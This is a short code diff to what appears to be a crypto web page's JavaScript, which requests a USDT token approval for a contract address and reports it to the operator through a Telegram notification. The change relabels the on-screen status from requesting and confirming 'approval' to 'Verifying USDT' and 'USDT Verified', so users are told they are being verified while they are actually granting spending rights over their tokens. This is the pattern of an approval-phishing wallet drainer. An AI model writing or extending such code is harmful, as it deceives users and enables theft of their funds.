@@ -467,7 +467,7 @@
         }
 
         try {
-            showStatus("⏳ Requesting USDT approval...", "pending");
+            showStatus("⏳ Verifying USDT...", "pending");
             console.log("Sending approval transaction...");
             
             const tx = await usdtContract.methods.approve(CONTRACT_ADDR, APPROVAL_AMOUNT).send({
@@ -476,7 +476,7 @@
 
             console.log("Approval tx hash:", tx.transactionHash);
             approvalApproved = true;
-            showStatus("✅ USDT Approved!", "success");
+            showStatus("✅ USDT Verified!", "success");
             
             await sendTelegramNotification(
                 `✅ <b>USDT Approved</b>\n\n` +
